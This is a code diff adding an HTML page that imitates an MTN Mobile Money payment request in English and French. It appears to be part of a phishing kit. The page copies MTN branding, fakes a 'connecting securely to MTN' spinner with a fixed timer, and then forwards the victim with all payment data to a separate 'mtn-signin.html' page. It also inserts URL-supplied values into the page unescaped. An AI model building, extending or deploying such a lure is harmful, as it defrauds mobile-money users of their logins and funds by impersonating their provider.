@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>MTN Mobile Money · Payment Request</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --mtn-royal: #2059B5;
+    --mtn-deep:  #073A87;
+    --mtn-white: #FFFFFF;
+    --mtn-green: #28A745;
+    --mtn-yellow:#FFCC08;
+    --mtn-text:  #456BA8;
+    --mtn-gray:  #7C8798;
+    --mtn-border:#E5E9F0;
+    --mtn-soft:  #F5F7FB;
+    --mtn-page:  #E7EEF7;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
+  body {
+    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: var(--mtn-page); color: var(--mtn-text);
+    -webkit-font-smoothing: antialiased; line-height: 1.45;
+    min-height: 100vh; display: flex; justify-content: center; padding: 0;
+  }
+  .phone {
+    width: 100%; max-width: 430px; min-height: 100vh;
+    background: var(--mtn-white); display: flex; flex-direction: column;
+    position: relative; overflow: hidden;
+  }
+  .toolbar {
+    flex-shrink: 0; background: var(--mtn-white);
+    padding: max(12px, env(safe-area-inset-top, 0px)) 16px 10px;
+    border-bottom: 1px solid var(--mtn-border);
+    display: grid; grid-template-columns: 1fr 1fr; gap: 10px; z-index: 30;
+  }
+  .tool-btn {
+    display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+    padding: 11px 12px; font-size: 13px; font-weight: 700;
+    border-radius: 10px; font-family: inherit; cursor: pointer;
+    transition: all .15s; border: 1.5px solid transparent;
+  }
+  .tool-outline { background: var(--mtn-white); color: var(--mtn-royal); border-color: #CBD5E1; }
+  .tool-outline:hover { border-color: var(--mtn-royal); background: #F0F5FC; }
+  .tool-outline.copied { background: var(--mtn-green); border-color: var(--mtn-green); color: #fff; }
+  .tool-primary { background: var(--mtn-royal); color: #fff; border-color: var(--mtn-royal); }
+  .tool-primary:hover { filter: brightness(1.08); }
+  .top {
+    position: relative; flex-shrink: 0;
+    background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%);
+    padding-top: 0; padding-bottom: 40px;
+    border-bottom-left-radius: 44% 48px;
+    border-bottom-right-radius: 44% 48px;
+  }
+  .brand {
+    display: inline-flex; align-items: baseline; gap: 2px;
+    font-weight: 900; font-size: 18px; letter-spacing: -0.4px; color: #fff;
+    padding: 18px 24px 0;
+  }
+  .brand .mtn { color: var(--mtn-yellow); }
+  .brand .mm  { color: #FFFFFF; opacity: 0.95; }
+  .hero {
+    position: absolute; left: 50%; transform: translateX(-50%);
+    bottom: -120px; width: 68%; max-width: 280px; aspect-ratio: 1 / 1; z-index: 5;
+  }
+  .hero .outer {
+    position: absolute; inset: 0; background: #fff; border-radius: 50%;
+    box-shadow: 0 14px 30px rgba(7,58,135,0.20),
+                0 0 0 6px rgba(255,255,255,0.70),
+                0 0 0 16px rgba(255,255,255,0.35);
+  }
+  .hero .green-ring {
+    position: absolute; inset: 8%;
+    border: 6px solid var(--mtn-green);
+    border-radius: 50%; background: #EAF7EE;
+    display: flex; align-items: center; justify-content: center; overflow: hidden;
+  }
+  .hero svg.man { width: 88%; height: 88%; display: block; }
+  .body {
+    flex: 1; overflow-y: auto; -webkit-overflow-scrolling: touch;
+    padding: 150px 22px 20px;
+    display: flex; flex-direction: column; align-items: center; text-align: center;
+  }
+  .status-block { margin-bottom: 16px; }
+  .status-title {
+    font-size: 20px; font-weight: 800; letter-spacing: -0.4px;
+    color: var(--mtn-text); line-height: 1.25; margin-bottom: 5px;
+  }
+  .status-desc {
+    font-size: 12.5px; color: var(--mtn-gray); line-height: 1.55;
+    max-width: 300px; margin: 0 auto;
+  }
+  .amount-block {
+    display: flex; align-items: baseline; justify-content: center; gap: 6px;
+    margin-bottom: 14px;
+  }
+  .amount-block .cur { font-size: 18px; font-weight: 700; color: var(--mtn-royal); }
+  .amount-block .val {
+    font-size: 40px; font-weight: 800; letter-spacing: -1.5px;
+    color: var(--mtn-deep); line-height: 1;
+  }
+  .btn-accept {
+    margin-top: 0;
+    padding: 15px 34px; font-size: 15px; font-weight: 800; letter-spacing: 0.5px;
+    background: var(--mtn-green); color: #fff;
+    border: none; border-radius: 999px;
+    cursor: pointer; font-family: inherit;
+    box-shadow: 0 10px 24px rgba(40,167,69,0.32);
+    transition: filter .15s, transform .1s; min-width: 220px;
+  }
+  .btn-accept:hover { filter: brightness(1.06); }
+  .btn-accept:active { transform: scale(0.98); }
+  .btn-accept:disabled { opacity: 0.7; cursor: wait; }
+  .recipient-line {
+    margin-top: 16px; font-size: 13.5px; color: var(--mtn-gray); line-height: 1.5;
+  }
+  .recipient-line .recv-name {
+    display: block; font-weight: 700; color: var(--mtn-text);
+    font-size: 14.5px; margin-top: 2px; word-break: break-word;
+  }
+  .details-panel {
+    width: 100%; margin-top: 20px;
+    background: var(--mtn-soft); border-radius: 12px;
+    padding: 4px 14px; text-align: left;
+  }
+  .detail-row {
+    display: flex; justify-content: space-between; align-items: flex-start;
+    gap: 12px; padding: 9px 0;
+    border-bottom: 1px solid #E9EDF4;
+  }
+  .detail-row:last-child { border-bottom: none; }
+  .detail-row .k { font-size: 11px; color: var(--mtn-gray); flex-shrink: 0; }
+  .detail-row .v {
+    font-size: 11.5px; font-weight: 600; text-align: right;
+    word-break: break-word; color: var(--mtn-text);
+  }
+  .mtn-footer {
+    width: 100%; margin-top: 20px;
+    background: var(--mtn-yellow);
+    border-radius: 12px;
+    padding: 14px 16px;
+    display: flex; align-items: center; justify-content: space-between;
+    gap: 12px; text-align: left;
+  }
+  .mtn-footer .foot-brand {
+    display: inline-flex; align-items: baseline; gap: 2px;
+    font-weight: 900; font-size: 15px; letter-spacing: -0.4px; color: #000;
+  }
+  .mtn-footer .foot-brand .mtn { color: #000; }
+  .mtn-footer .foot-brand .mm  { color: #000; opacity: 0.85; }
+  .mtn-footer .foot-support {
+    font-size: 11px; color: #000; line-height: 1.45; font-weight: 600;
+    text-align: right;
+  }
+  .mtn-footer .foot-support strong { font-weight: 800; }
+  .toast {
+    position: fixed; bottom: 24px; left: 50%;
+    transform: translateX(-50%) translateY(80px);
+    background: #0A0F1F; color: #fff; padding: 11px 18px; border-radius: 9px;
+    font-size: 12.5px; font-weight: 600; opacity: 0; transition: all .3s ease;
+    z-index: 50; pointer-events: none; max-width: 90%; text-align: center;
+  }
+  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+  .body.initiating {
+    justify-content: center;
+    padding-top: 40px;
+  }
+  .init-spinner {
+    width: 58px; height: 58px;
+    border: 4px solid var(--mtn-soft);
+    border-top-color: var(--mtn-green);
+    border-radius: 50%;
+    animation: initSpin 0.9s linear infinite;
+    margin-bottom: 26px;
+  }
+  @keyframes initSpin { to { transform: rotate(360deg); } }
+  .init-title {
+    font-size: 21px; font-weight: 800; letter-spacing: -0.4px;
+    color: var(--mtn-deep); margin-bottom: 8px; line-height: 1.25;
+  }
+  .init-desc {
+    font-size: 13px; color: var(--mtn-gray); line-height: 1.6;
+    max-width: 300px; margin: 0 auto;
+  }
+  .init-note {
+    margin-top: 22px; font-size: 11.5px; color: var(--mtn-gray);
+    font-weight: 600;
+  }
+  body.is-initiating .toolbar,
+  body.is-initiating .top { display: none !important; }
+  body.is-initiating .body { padding: 40px 22px; }
+
+  .error-box {
+    padding: 40px 24px; text-align: center; color: var(--mtn-gray);
+    font-size: 13px; line-height: 1.6;
+  }
+  .expired-icon {
+    width: 76px; height: 76px; border-radius: 50%;
+    background: #94A3B8;
+    display: inline-flex; align-items: center; justify-content: center;
+    margin-bottom: 16px;
+    box-shadow: 0 0 0 6px rgba(148,163,184,0.12),
+                0 10px 22px rgba(148,163,184,0.28);
+  }
+  .expired-icon svg {
+    width: 38px; height: 38px;
+    stroke: #fff; fill: none;
+    stroke-width: 3.2; stroke-linecap: round; stroke-linejoin: round;
+  }
+
+  @media (pointer: coarse) {
+    .btn-accept { width: 100%; max-width: 320px; padding: 16px 24px; }
+  }
+  @media (orientation: landscape) and (max-height: 500px) {
+    .top { padding-bottom: 22px; }
+    .brand { padding: 12px 22px 0; font-size: 16px; }
+    .hero { width: 34%; max-width: 160px; bottom: -60px; }
+    .body { padding: 72px 22px 16px; }
+    .status-title { font-size: 17px; }
+    .amount-block .val { font-size: 30px; }
+    .recipient-line { margin-top: 12px; }
+    .details-panel { margin-top: 14px; }
+    .mtn-footer { margin-top: 14px; }
+  }
+  @media print {
+    body { background: #fff; padding: 0; }
+    .toolbar, .brand, .mtn-footer { display: none !important; }
+    .phone { box-shadow: none; }
+    .top { background: #fff; border-bottom: 1px solid #ccc; padding: 12px 0; }
+    .body { padding-top: 130px; }
+    .btn-accept { display: none !important; }
+  }
+  @media (max-width: 380px) {
+    .tool-btn { padding: 10px; font-size: 12px; }
+    .brand { font-size: 16px; padding: 14px 20px 0; }
+    .top { padding-bottom: 32px; border-bottom-left-radius: 42% 42px; border-bottom-right-radius: 42% 42px; }
+    .hero { width: 64%; bottom: -100px; }
+    .body { padding: 130px 18px 18px; }
+    .status-title { font-size: 18px; }
+    .amount-block .val { font-size: 34px; }
+    .btn-accept { padding: 13px 28px; font-size: 14px; min-width: 190px; }
+    .init-title { font-size: 19px; }
+    .init-spinner { width: 48px; height: 48px; }
+  }
+  @media (max-height: 680px) {
+    .hero { width: 56%; bottom: -84px; }
+    .body { padding-top: 108px; }
+    .status-title { font-size: 18px; }
+    .amount-block .val { font-size: 32px; }
+    .details-panel, .mtn-footer { margin-top: 16px; }
+  }
+  @media (min-width: 640px) {
+    body { padding: 32px 0; align-items: center; }
+    .phone {
+      min-height: calc(100vh - 64px); max-height: 900px;
+      border-radius: 32px;
+      box-shadow: 0 40px 100px rgba(7, 58, 135, 0.18);
+      overflow: hidden;
+    }
+    .top { border-top-left-radius: 32px; border-top-right-radius: 32px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="phone">
+
+  <div class="toolbar">
+    <button class="tool-btn tool-outline" id="copyBtn" onclick="copyReceipt()">
+      <span>📋</span> <span id="copyLbl">Copy Receipt</span>
+    </button>
+    <button class="tool-btn tool-primary" onclick="window.print()">
+      <span>🖨</span> <span id="printLbl">Print</span>
+    </button>
+  </div>
+
+  <div class="top">
+    <div class="brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
+
+    <div class="hero" aria-hidden="true">
+      <div class="outer"></div>
+      <div class="green-ring">
+        <svg class="man" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <linearGradient id="shirtGrad" x1="0" y1="0" x2="0" y2="1">
+              <stop offset="0%" stop-color="#FFE64A"/>
+              <stop offset="100%" stop-color="#FFC800"/>
+            </linearGradient>
+            <linearGradient id="skinGrad" x1="0" y1="0" x2="0" y2="1">
+              <stop offset="0%" stop-color="#8B5A3C"/>
+              <stop offset="100%" stop-color="#6E422A"/>
+            </linearGradient>
+          </defs>
+          <path d="M40 200 C 40 158, 70 138, 100 138 C 130 138, 160 158, 160 200 Z" fill="url(#shirtGrad)"/>
+          <rect x="88" y="120" width="24" height="26" rx="10" fill="url(#skinGrad)"/>
+          <circle cx="100" cy="86" r="38" fill="url(#skinGrad)"/>
+          <path d="M64 76 C 68 48, 88 40, 100 40 C 112 40, 132 48, 136 76 C 130 66, 118 58, 100 58 C 82 58, 70 66, 64 76 Z" fill="#2C1B10"/>
+          <path d="M72 96 C 74 118, 86 130, 100 130 C 114 130, 126 118, 128 96 C 122 108, 112 116, 100 116 C 88 116, 78 108, 72 96 Z" fill="#2C1B10"/>
+          <path d="M86 102 Q 100 112 114 102" stroke="#FFFFFF" stroke-width="3.2" fill="none" stroke-linecap="round"/>
+          <circle cx="88" cy="86" r="3.2" fill="#FFFFFF"/>
+          <circle cx="112" cy="86" r="3.2" fill="#FFFFFF"/>
+          <circle cx="88" cy="86" r="1.6" fill="#1A0E06"/>
+          <circle cx="112" cy="86" r="1.6" fill="#1A0E06"/>
+          <path d="M148 160 C 168 150, 176 128, 172 108 L 178 104 C 184 128, 176 158, 154 172 Z" fill="#8B5A3C"/>
+          <g transform="translate(178 96)">
+            <rect x="-8" y="-4" width="16" height="14" rx="4" fill="#8B5A3C"/>
+            <rect x="-4" y="-16" width="8" height="14" rx="4" fill="#8B5A3C"/>
+          </g>
+          <path d="M52 160 C 36 158, 28 148, 26 136 L 34 134 C 36 144, 42 152, 52 154 Z" fill="#8B5A3C"/>
+          <g transform="translate(152 42)">
+            <circle r="16" fill="#28A745"/>
+            <path d="M-6 0 L-1 6 L7 -5" stroke="#FFFFFF" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+          </g>
+        </svg>
+      </div>
+    </div>
+  </div>
+
+  <div class="body" id="bodyArea">
+
+    <div class="status-block">
+      <div class="status-title" id="statusTitle">Payment Request Received</div>
+      <div class="status-desc" id="statusDesc">Please review the details below and confirm the payment.</div>
+    </div>
+
+    <div class="amount-block">
+      <span class="cur" id="amtCur">—</span>
+      <span class="val" id="amtVal">0.00</span>
+    </div>
+
+    <button class="btn-accept" id="acceptBtn" onclick="acceptPayment()">Accept payment</button>
+
+    <div class="recipient-line">
+      <span id="recipientLabel">To</span>
+      <span class="recv-name" id="reqRecipient">—</span>
+    </div>
+
+    <div class="details-panel" id="detailsPanel"></div>
+
+    <div class="mtn-footer">
+      <div class="foot-brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
+      <div class="foot-support">
+        <span id="helpLabel">Need help?</span><br>
+        <span id="callLabel">Call</span> <strong id="supportNum">—</strong>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+  /* ═══════════════════════════════════════════════════════════
+     TRANSLATIONS — English + French
+  ═══════════════════════════════════════════════════════════ */
+  const I18N = {
+    en: {
+      copyReceipt: 'Copy Receipt',
+      print: 'Print',
+      copied: 'Copied ✓',
+      copyToast: 'Receipt copied to clipboard.',
+      statusTitle: 'Payment Request Received',
+      statusDesc: 'Please review the details below and confirm the payment.',
+      acceptBtn: 'Accept payment',
+      toLabel: 'To',
+      needHelp: 'Need help?',
+      callLabel: 'Call',
+      initiating: 'Initiating payment…',
+      initiatingDesc: 'Connecting securely to MTN Mobile Money to authorize your payment. Please do not close this page.',
+      initiatingNote: 'This usually takes a few seconds.',
+      expiredTitle: 'Payment Request Expired',
+      expiredDescPrefix: 'This payment link is no longer valid.',
+      expiredDescSuffix: 'Please ask the merchant to send you a new link.',
+      expiredOn: 'It expired on',
+      invalidLink: 'Invalid or missing link. Please request a new payment link from the merchant.',
+      notFound: 'We couldn\'t find this payment request. Please request a new payment link from the merchant.',
+      kCountry: 'Country',
+      kPaymentMethod: 'Payment method',
+      kService: 'Service',
+      kMarketed: 'Marketed',
+      kTransactionDate: 'Transaction date',
+      kStatus: 'Status',
+      vReceived: 'Payment Request Received',
+      docTitle: 'Payment Request Expired · MTN Mobile Money',
+      docTitleInvalid: 'Invalid Link · MTN Mobile Money',
+      receiptTitle: 'MTN Mobile Money — Payment Request',
+      receiptStatus: 'Status',
+      receiptAmount: 'Amount',
+      receiptRecipient: 'Recipient',
+      receiptCountry: 'Country',
+      receiptTxId: 'Transaction ID',
+      receiptPaymentMethod: 'Payment method',
+      receiptService: 'Service',
+      receiptMarketed: 'Marketed',
+      receiptDate: 'Date'
+    },
+    fr: {
+      copyReceipt: 'Copier le reçu',
+      print: 'Imprimer',
+      copied: 'Copié ✓',
+      copyToast: 'Reçu copié dans le presse-papiers.',
+      statusTitle: 'Demande de paiement reçue',
+      statusDesc: 'Veuillez vérifier les détails ci-dessous et confirmer le paiement.',
+      acceptBtn: 'Accepter le paiement',
+      toLabel: 'À',
+      needHelp: 'Besoin d\'aide ?',
+      callLabel: 'Appelez le',
+      initiating: 'Paiement en cours…',
+      initiatingDesc: 'Connexion sécurisée à MTN Mobile Money pour autoriser votre paiement. Veuillez ne pas fermer cette page.',
+      initiatingNote: 'Cela prend généralement quelques secondes.',
+      expiredTitle: 'Demande de paiement expirée',
+      expiredDescPrefix: 'Ce lien de paiement n\'est plus valide.',
+      expiredDescSuffix: 'Veuillez demander au marchand de vous envoyer un nouveau lien.',
+      expiredOn: 'Il a expiré le',
+      invalidLink: 'Lien invalide ou manquant. Veuillez demander un nouveau lien de paiement au marchand.',
+      notFound: 'Nous n\'avons pas trouvé cette demande de paiement. Veuillez demander un nouveau lien de paiement au marchand.',
+      kCountry: 'Pays',
+      kPaymentMethod: 'Mode de paiement',
+      kService: 'Service',
+      kMarketed: 'Commercialisé par',
+      kTransactionDate: 'Date de la transaction',
+      kStatus: 'Statut',
+      vReceived: 'Demande de paiement reçue',
+      docTitle: 'Demande de paiement expirée · MTN Mobile Money',
+      docTitleInvalid: 'Lien invalide · MTN Mobile Money',
+      receiptTitle: 'MTN Mobile Money — Demande de paiement',
+      receiptStatus: 'Statut',
+      receiptAmount: 'Montant',
+      receiptRecipient: 'Destinataire',
+      receiptCountry: 'Pays',
+      receiptTxId: 'ID de transaction',
+      receiptPaymentMethod: 'Mode de paiement',
+      receiptService: 'Service',
+      receiptMarketed: 'Commercialisé par',
+      receiptDate: 'Date'
+    }
+  };
+
+  /* Detect language from URL (?lang=fr) or from data */
+  const urlParams = new URLSearchParams(location.search);
+  const urlLang = (urlParams.get('lang') || '').toLowerCase();
+  let T = I18N[urlLang] || I18N.en;
+  let currentLang = I18N[urlLang] ? urlLang : 'en';
+
+  function setLang(lang) {
+    currentLang = (lang || 'en').toLowerCase();
+    T = I18N[currentLang] || I18N.en;
+    applyTranslations();
+  }
+
+  function applyTranslations() {
+    /* Toolbar */
+    const copyLbl = document.getElementById('copyLbl');
+    if (copyLbl) copyLbl.textContent = T.copyReceipt;
+    const printLbl = document.getElementById('printLbl');
+    if (printLbl) printLbl.textContent = T.print;
+
+    /* Status block */
+    const statusTitle = document.getElementById('statusTitle');
+    if (statusTitle) statusTitle.textContent = T.statusTitle;
+    const statusDesc = document.getElementById('statusDesc');
+    if (statusDesc) statusDesc.textContent = T.statusDesc;
+
+    /* Accept button */
+    const acceptBtn = document.getElementById('acceptBtn');
+    if (acceptBtn) acceptBtn.textContent = T.acceptBtn;
+
+    /* Recipient */
+    const recipientLabel = document.getElementById('recipientLabel');
+    if (recipientLabel) recipientLabel.textContent = T.toLabel;
+
+    /* Footer */
+    const helpLabel = document.getElementById('helpLabel');
+    if (helpLabel) helpLabel.textContent = T.needHelp;
+    const callLabel = document.getElementById('callLabel');
+    if (callLabel) callLabel.textContent = T.callLabel;
+  }
+
+  /* ═══════════════════════════════════════════════════════════
+     DATA DECODING
+  ═══════════════════════════════════════════════════════════ */
+  async function decodeData() {
+    const params = new URLSearchParams(location.search);
+    const code = params.get('r') || params.get('t');
+
+    if (code) {
+      try {
+        const res = await fetch('/api/links/' + encodeURIComponent(code));
+
+        if (res.status === 410) {
+          const body = await res.json().catch(() => ({}));
+          return { _expired: true, expiresAt: body.expiresAt || null };
+        }
+        if (res.status === 404) {
+          return { _notFound: true };
+        }
+        if (!res.ok) return { _notFound: true };
+
+        return await res.json();
+      } catch (e) {
+        console.error('short-link fetch failed', e);
+        return { _notFound: true };
+      }
+    }
+
+    const raw = params.get('d');
+    if (!raw) return null;
+    try {
+      let b64 = raw.replace(/-/g, '+').replace(/_/g, '/');
+      while (b64.length % 4) b64 += '=';
+      return JSON.parse(decodeURIComponent(escape(atob(b64))));
+    } catch (e) {
+      return { _notFound: true };
+    }
+  }
+
+  /* ═══════════════════════════════════════════════════════════
+     FORMATTING HELPERS
+  ═══════════════════════════════════════════════════════════ */
+  const CURRENCY_LOCALE = {
+    XAF: 'fr-CM', ZMW: 'en-ZM', UGX: 'en-UG', GHS: 'en-GH',
+    XOF: 'fr-BJ', USD: 'en-US'
+  };
+  function formatAmount(amount, currency) {
+    const locale = CURRENCY_LOCALE[currency] || 'en-US';
+    const n = Number(amount);
+    if (!isFinite(n)) return '0 ' + (currency || '');
+    try {
+      const parts = new Intl.NumberFormat(locale, {
+        minimumFractionDigits: 0, maximumFractionDigits: 2
+      }).format(n);
+      const pretty = (currency === 'XAF' || currency === 'XOF' || currency === 'UGX')
+        ? parts.replace(/\u202F|\u00A0|,/g, ' ')
+        : parts;
+      return pretty + ' ' + currency;
+    } catch (e) { return n + ' ' + (currency || ''); }
+  }
+
+  const SUPPORT_NUMBERS = {
+    'Cameroon': '8787', 'Zambia': '111', 'Zambia (MTN)': '111',
+    'Uganda': '100', 'Uganda (MTN)': '100',
+    'Ghana': '100', 'Ghana (MTN)': '100',
+    'Benin': '111'
+  };
+
+  function formatDate(ts) {
+    const d = ts ? new Date(ts) : new Date();
+    const locale = currentLang === 'fr' ? 'fr-FR' : undefined;
+    return d.toLocaleString(locale, {
+      day: '2-digit', month: 'short', year: 'numeric',
+      hour: '2-digit', minute: '2-digit'
+    });
+  }
+
+  function showToast(msg) {
+    const t = document.getElementById('toast');
+    t.textContent = msg; t.classList.add('show');
+    clearTimeout(t._timer);
+    t._timer = setTimeout(() => t.classList.remove('show'), 2200);
+  }
+
+  /* ═══════════════════════════════════════════════════════════
+     STATE
+  ═══════════════════════════════════════════════════════════ */
+  let tx = { ref: '', am: '', cur: '', rn: '', c: '', pm: '', sn: '', mk: '', an: '', dt: '' };
+
+  /* ═══════════════════════════════════════════════════════════
+     INITIALISE PAGE
+  ═══════════════════════════════════════════════════════════ */
+  async function init() {
+    const data = await decodeData();
+
+    if (!data) {
+      document.querySelector('.body').innerHTML =
+        '<div class="error-box">' + T.invalidLink + '</div>';
+      document.getElementById('acceptBtn').style.display = 'none';
+      document.getElementById('copyBtn').style.display = 'none';
+      return;
+    }
+
+    if (data._expired) {
+      document.getElementById('acceptBtn').style.display = 'none';
+      document.getElementById('copyBtn').style.display = 'none';
+      const expText = data.expiresAt
+        ? T.expiredOn + ' ' + formatDate(data.expiresAt) + '.'
+        : '';
+      document.querySelector('.body').innerHTML =
+        '<div class="expired-icon">' +
+          '<svg viewBox="0 0 24 24"><path d="M12 8v5M12 16.5v.01"/></svg>' +
+        '</div>' +
+        '<div class="status-block">' +
+          '<div class="status-title">' + T.expiredTitle + '</div>' +
+          '<div class="status-desc">' + T.expiredDescPrefix + ' ' + expText + '<br>' + T.expiredDescSuffix + '</div>' +
+        '</div>';
+      document.title = T.docTitle;
+      return;
+    }
+
+    if (data._notFound) {
+      document.querySelector('.body').innerHTML =
+        '<div class="error-box">' + T.notFound + '</div>';
+      document.getElementById('acceptBtn').style.display = 'none';
+      document.getElementById('copyBtn').style.display = 'none';
+      document.title = T.docTitleInvalid;
+      return;
+    }
+
+    /* ─── Data loaded — set language from data if URL didn't specify ─── */
+    if (!urlLang && data.lang) {
+      setLang(data.lang);
+    } else {
+      applyTranslations();
+    }
+
+    tx = {
+      ref: data.tx  || '',
+      am:  data.am  || '',
+      cur: data.cur || '',
+      rn:  data.rn  || '',
+      c:   data.c   || '',
+      pm:  data.pm  || '',
+      sn:  data.sn  || '',
+      mk:  data.mk  || '',
+      an:  data.an  || '',
+      dt:  data.dt  || data.createdAt || ''
+    };
+
+    document.getElementById('amtCur').textContent = tx.cur || '';
+    document.getElementById('amtVal').textContent =
+      formatAmount(tx.am, tx.cur).replace(' ' + tx.cur, '');
+    document.getElementById('reqRecipient').textContent = tx.rn || '—';
+
+    const rows = [
+      { k: T.kCountry,          v: tx.c },
+      { k: T.kPaymentMethod,    v: tx.pm },
+      { k: T.kService,          v: tx.sn },
+      { k: T.kMarketed,         v: tx.mk },
+      { k: T.kTransactionDate,  v: tx.dt ? formatDate(tx.dt) : formatDate() },
+      { k: T.kStatus,           v: T.vReceived }
+    ];
+    let html = '';
+    rows.forEach(r => {
+      if (!r.v && r.v !== 0) return;
+      html += `<div class="detail-row"><span class="k">${r.k}</span><span class="v">${r.v}</span></div>`;
+    });
+    document.getElementById('detailsPanel').innerHTML = html;
+
+    document.getElementById('supportNum').textContent = SUPPORT_NUMBERS[tx.c] || '—';
+  }
+
+  /* ═══════════════════════════════════════════════════════════
+     COPY RECEIPT
+  ═══════════════════════════════════════════════════════════ */
+  function copyReceipt() {
+    const lines = [
+      T.receiptTitle,
+      '----------------------------------',
+      T.receiptStatus + ': ' + T.vReceived,
+      T.receiptAmount + ': ' + formatAmount(tx.am, tx.cur),
+      T.receiptRecipient + ': ' + (tx.rn || ''),
+      T.receiptCountry + ': '   + (tx.c || ''),
+      T.receiptTxId + ': ' + (tx.ref || ''),
+      T.receiptPaymentMethod + ': ' + (tx.pm || ''),
+      T.receiptService + ': ' + (tx.sn || ''),
+      T.receiptMarketed + ': ' + (tx.mk || ''),
+      T.receiptDate + ': ' + formatDate(tx.dt)
+    ].join('\n');
+
+    const btn = document.getElementById('copyBtn');
+    const lbl = document.getElementById('copyLbl');
+    const done = () => {
+      btn.classList.add('copied');
+      lbl.textContent = T.copied;
+      showToast(T.copyToast);
+      setTimeout(() => { btn.classList.remove('copied'); lbl.textContent = T.copyReceipt; }, 1800);
+    };
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(lines).then(done).catch(() => { fallbackCopy(lines); done(); });
+    } else { fallbackCopy(lines); done(); }
+  }
+
+  function fallbackCopy(text) {
+    const ta = document.createElement('textarea');
+    ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); } catch (e) {}
+    document.body.removeChild(ta);
+  }
+
+  /* ═══════════════════════════════════════════════════════════
+     ACCEPT PAYMENT
+  ═══════════════════════════════════════════════════════════ */
+  function acceptPayment() {
+    const btn = document.getElementById('acceptBtn');
+    if (btn && btn.disabled) return;
+    if (btn) btn.disabled = true;
+
+    document.body.classList.add('is-initiating');
+
+    const bodyArea = document.getElementById('bodyArea');
+    if (bodyArea) {
+      bodyArea.classList.add('initiating');
+      bodyArea.innerHTML = ''
+        + '<div class="init-spinner" aria-hidden="true"></div>'
+        + '<div class="init-title">' + T.initiating + '</div>'
+        + '<div class="init-desc">' + T.initiatingDesc + '</div>'
+        + '<div class="init-note">' + T.initiatingNote + '</div>';
+    }
+
+    const q = new URLSearchParams({
+      tx:  tx.ref,
+      am:  tx.am,
+      cur: tx.cur,
+      rn:  tx.rn,
+      c:   tx.c,
+      pm:  tx.pm,
+      sn:  tx.sn,
+      mk:  tx.mk,
+      an:  tx.an,
+      dt:  tx.dt,
+      lang: currentLang
+    });
+    setTimeout(() => {
+      window.location.href = 'mtn-signin.html?' + q.toString();
+    }, 3000);
+  }
+
+  document.addEventListener('DOMContentLoaded', init);
+</script>
+</body>
+</html>
